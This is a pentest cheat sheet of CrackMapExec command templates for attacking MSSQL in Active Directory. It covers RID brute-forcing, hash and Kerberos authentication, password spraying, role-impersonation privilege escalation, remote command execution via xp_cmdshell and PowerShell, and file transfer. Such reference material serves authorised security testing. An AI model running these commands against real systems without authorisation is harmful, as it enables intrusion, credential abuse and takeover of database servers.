# cme (MSSQL)

% cme, crackmapexec, Active Directory, nxc, netexec, mssql

## Enumerate MSSQL reachable hosts
#assessment/AD #attack_type/Enumeration #port/1433 #protocol/mssql #access/Anonymous 

Enumerate network hosts that can be reached via MSSQL.

```bash
cme mssql <ip>
```

## Enumerate domain users by RID bruteforce
#assessment/AD #attack_type/Enumeration #port/1433 #protocol/mssql #access/Anonymous 

Enumerate domain users by bruteforcing the RID.

```bash
cme mssql <ip> -u <user> -p <password> --rid-brute
```

## MSSQL auth
#assessment/AD #attack_type/Authentication #port/1433 #protocol/mssql #access/MSSQL_user 

Authenticate via a MSSQL account on the remote target.

```bash
cme mssql <ip> -u <user> -p <password>
```

## Domain auth
#assessment/AD #attack_type/Authentication #port/1433 #protocol/mssql #access/Domain_user 

Authenticate via a domain account on the remote target.

```bash
cme mssql <ip> -u <user> -p <password> -d <domain>
```

## Domain auth with hash
#assessment/AD #attack_type/Authentication #port/1433 #protocol/mssql #access/Domain_user 

```bash
cme mssql <ip> -u <user> -H <hash> -d <domain>
```

## Local auth
#assessment/AD #attack_type/Authentication #port/1433 #protocol/mssql #access/Local_user

Authenticate via a local account on the remote target.

```bash
cme mssql <ip> -u <user> -p <password> --local-auth
```

## Local auth with hash
#assessment/AD #attack_type/Authentication #port/1433 #protocol/mssql #access/Local_user

Authenticate via a local account using the hash on the remote target.

```bash
cme mssql <ip> -u <user> -H <hash> --local-auth
```

## Kerberos auth
#assessment/AD #attack_type/Authentication #port/1433 #protocol/mssql #access/Domain_user 

Authenticate via Kerberos on the remote target.

```bash
cme mssql <ip> -u <user> -p <password> -k
```

## Kerberos TGT auth
#assessment/AD #attack_type/Authentication #port/1433 #protocol/mssql #access/Domain_user 

Authenticate via a Kerberos TGT on the remote target.

Previously import ticket : 
export KRB5CCNAME=ticket.ccache

```bash
cme mssql <ip> -u <user> -k --use-kcache
```

## Password spray (username=password)
#assessment/AD #attack_type/Bruteforce #port/1433 #protocol/mssql #access/Anonymous 

Password spray to find accounts with weak passwords.

```bash
cme mssql <ip> -u <users.list> -p <users.list> --no-bruteforce --continue-on-success
```

## List MSSQL role impersonation
#assessment/AD #attack_type/Privesc #port/1433 #protocol/mssql #access/Domain_user 

List MSSQL roles that can be impersonated on the remote target. 

```bash
cme mssql <ip> -u <user> -p <password> -M mssql_priv
```

## Impersonate MSSQL role
#assessment/AD #attack_type/Privesc #port/1433 #protocol/mssql #access/Domain_user 

Impersonate a MSSQL role on the remote target. 

```bash
cme mssql <ip> -u <user> -p <password> -M mssql_priv ACTION=privesc
```

## Rollback MSSQL role impersonation
#assessment/AD #attack_type/Privesc #port/1433 #protocol/mssql #access/Domain_user 

Rollback a MSSQL role impersonation on the remote target. 

```bash
cme mssql <ip> -u <user> -p <password> -M mssql_priv ACTION=rollback
```

## Execute MSSQL query
#assessment/AD #attack_type/Command_Execution #port/1433 #protocol/mssql #access/Domain_user 

```bash
cme mssql <ip> -u <user> -p <password> --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
```

## Execute remote commands (xp_cmdshell)
#assessment/AD #attack_type/Command_Execution #port/1433 #protocol/mssql #access/Domain_user 

Execute remote commands through Windows xp_cmdshell.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme mssql <ip> -u <user> -p <password> -x <command>
```

## Execute remote commands (PowerShell)
#assessment/AD #attack_type/Command_Execution #port/1433 #protocol/mssql #access/Domain_user 

Execute remote commands through Windows PowerShell.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme mssql <ip> -u <user> -p <password> -X <command>
```

## Put file
#assessment/AD #attack_type/Other #port/1433 #protocol/mssql #access/Domain_user

Send a local file to the remote target.

```bash
cme mssql <ip> -u <user> -p <password> --put-file <local_file> <remote_path|\\Windows\\Temp\\target.txt>
```

## Get file
#assessment/AD #attack_type/Other #port/1433 #protocol/mssql #access/Domain_user

Get a local file from the remote target.

```bash
cme mssql <ip> -u <user> -p <password> --get-file <remote_path|\\Windows\\Temp\\target.txt> <local_file>
```

= ip: 192.168.1.0/24
= dc-ip: $DC_IP
= user: $USER
= password: $PASSWORD
= domain: $DOMAIN
